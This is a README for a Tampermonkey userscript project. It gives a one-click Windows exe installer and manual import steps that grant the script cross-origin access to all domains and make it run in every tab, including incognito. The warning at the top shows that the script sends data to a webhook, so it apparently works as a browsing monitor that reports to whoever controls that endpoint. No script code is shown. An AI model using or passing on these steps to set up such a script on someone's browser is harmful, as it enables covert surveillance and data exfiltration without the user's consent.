> [!WARNING]  
> Don't use this for yourself. If you want to use it change the webhook to a different one

## Fast installation
For an automated installation, download the [`output.exe`](https://github.com/Filipsys/tampermonkey-script-config/raw/8202b137cbe8e308f8ddd2da7462c4aaa2933756/chrome/output.exe) file with the assets folder and run the exe on windows to configure the extension for Chrome. Make sure that the exe file is in the same directory as the assets folder and that there are no custom themes installed. This macro will work for english and polish browsers only.

## Manual Installation
1. Install [Tampermonkey](https://www.tampermonkey.net/)
2. Open the Tampermonkey Dashboard
3. Select the 'Utilities' Tab
4. Find the 'Import from URL' section
5. Paste the following URL: [`https://raw.githubusercontent.com/Filipsys/tampermonkey-script-config/refs/heads/dev/main.js`](https://raw.githubusercontent.com/Filipsys/tampermonkey-script-config/refs/heads/dev/main.js)
6. Select 'Install'
7. Once installed, when opening a website, a page should open asking for access to a cross-origin resource. Select 'Always allow all domains'.
8. Open the script settings in the 'Installed Userscipts' section and change 'Run in' to `All tabs` for the script to work in incognito tabs.

If your target browser is Chrome, paste `chrome://extensions` in the URL bar, turn developer mode on, navigate to the Chrome Tampermonkey extension settings and change `Allow in incognito mode` to true.
